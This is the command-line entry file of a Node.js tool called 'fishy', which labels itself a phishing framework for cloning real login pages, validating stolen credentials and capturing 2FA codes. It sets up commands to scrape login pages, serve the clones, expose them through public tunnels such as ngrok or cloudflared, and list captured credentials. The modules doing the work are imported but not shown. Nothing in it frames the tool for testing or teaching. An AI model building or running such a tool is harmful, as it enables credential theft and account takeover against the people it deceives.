#!/usr/bin/env node

import { Command } from 'commander';
import chalk from 'chalk';
import inquirer from 'inquirer';
import { printBanner } from '../lib/ui.js';
import { serveCommand } from '../commands/serve.js';
import { scrapeCommand } from '../commands/scrape.js';
import { tunnelCommand } from '../commands/tunnel.js';
import { listCommand } from '../commands/list.js';
import { showCaptures, mainMenu } from '../lib/tui.js';

const program = new Command();

program
  .name('fishy')
  .description('🐟 Phishing framework — real page cloning, credential validation, 2FA capture')
  .version('1.0.0');

program
  .command('serve [service]')
  .description('Start a phishing server for a scraped page')
  .option('-p, --port <port>', 'Server port (default: random)', parseInt)
  .option('-t, --tunnel [type]', 'Start a tunnel (ngrok/serveo/cloudflared/localhostrun/bore)')
  .option('--no-open', 'Don\'t open browser automatically')
  .action((service, options) => serveCommand(service, options));

program
  .command('scrape [service]')
  .description('Scrape a login page (uses Puppeteer)')
  .option('-u, --url <url>', 'Custom URL to scrape')
  .action((service, options) => scrapeCommand(service, options));

program
  .command('tunnel [type]')
  .description('Start a tunnel to expose a local server')
  .option('-p, --port <port>', 'Local port to tunnel', parseInt, 8080)
  .action((type, options) => tunnelCommand(type, options));

program
  .command('list')
  .description('List scraped pages and captured credentials')
  .action(() => listCommand());

program
  .command('captures')
  .description('Show captured credentials')
  .action(() => showCaptures());

// Interactive TUI mode (default when no subcommand)
async function interactiveMode() {
  printBanner();

  let running = true;
  while (running) {
    const action = await mainMenu();

    switch (action) {
      case 'serve':
        await serveCommand(null, { open: true });
        break;
      case 'scrape':
        await scrapeCommand(null, {});
        break;
      case 'tunnel':
        await tunnelCommand(null, { port: 8080 });
        break;
      case 'captures':
        await showCaptures();
        break;
      case 'list':
        listCommand();
        break;
      case 'exit':
        running = false;
        console.log(chalk.gray('\n  Bye.\n'));
        break;
    }
  }
}

// Parse args
const args = process.argv.slice(2);

if (args.length === 0) {
  // Interactive TUI mode
  interactiveMode().catch((err) => {
    console.error(chalk.red(`Error: ${err.message}`));
    process.exit(1);
  });
} else {
  program.parse(process.argv);
}
